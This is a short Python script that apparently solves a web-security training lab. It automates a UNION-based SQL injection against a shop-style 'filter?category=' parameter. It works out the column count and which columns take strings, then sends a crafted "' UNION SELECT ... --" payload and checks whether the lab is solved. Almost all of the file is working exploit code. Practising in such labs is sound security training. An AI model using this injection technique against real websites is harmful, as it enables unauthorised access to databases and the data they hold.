from lib import (
    SESSION,
    generate_parser,
    check_is_lab_solved,
    find_no_of_columns,
    find_columns_of_type_string,
    fetch_target_string,
)

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    target_string = fetch_target_string(lab_url)

    columns = find_no_of_columns(f"{lab_url}/filter?category=")

    target_columns = find_columns_of_type_string(
        lab_url_with_end_point=f"{lab_url}/filter?category=",
        no_of_columns=columns,
    )

    print("[+] Querying the target string...")

    payload = ", ".join(
        [
            f"'{target_string}'" if j in target_columns else "NULL"
            for j in range(columns)
        ]
    )

    query = f"' UNION SELECT {payload}--"

    print(f"[+] Making Query: {lab_url}/filter?category={query}")

    if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
        print("[+] The string is queried successfully")
    else:
        print("[-] Failed to query the string")
        exit()

    check_is_lab_solved(lab_url)
